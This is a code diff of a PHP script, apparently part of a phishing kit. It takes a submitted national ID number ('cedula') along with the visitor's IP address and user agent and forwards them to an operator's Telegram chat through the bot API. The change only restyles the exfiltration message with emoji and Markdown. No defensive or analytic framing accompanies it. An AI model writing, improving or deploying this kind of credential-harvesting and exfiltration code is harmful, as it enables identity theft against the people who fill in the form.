@@ -30,8 +30,15 @@ function getUserIP()
 
 $user_ip = getUserIP();
 
-$msg = "GUIA ENTRANTE ✅🎉: ". $_POST['cedula'] . "\nip: ". $user_ip . "\nuseragent: ". $_SERVER['HTTP_USER_AGENT'] . "\n";
-file_get_contents("https://api.telegram.org/bot". $token ."/sendMessage?chat_id=". $telegram_admin_id ."&text=" . urlencode($msg) ."");
+$msg = "🚨 *NUEVA GUIA ENTRANTE* 🚨\n\n".
+       "👤 *Cédula:* `". $_POST['cedula'] ."`\n".
+       "🌍 *IP:* `". $user_ip ."`\n".
+       "🖥 *User-Agent:* _". $_SERVER['HTTP_USER_AGENT'] ."_" ;
+
+file_get_contents("https://api.telegram.org/bot". $token .
+    "/sendMessage?chat_id=". $telegram_admin_id .
+    "&parse_mode=Markdown&text=" . urlencode($msg));
+
 ?>
 
 <html><!--
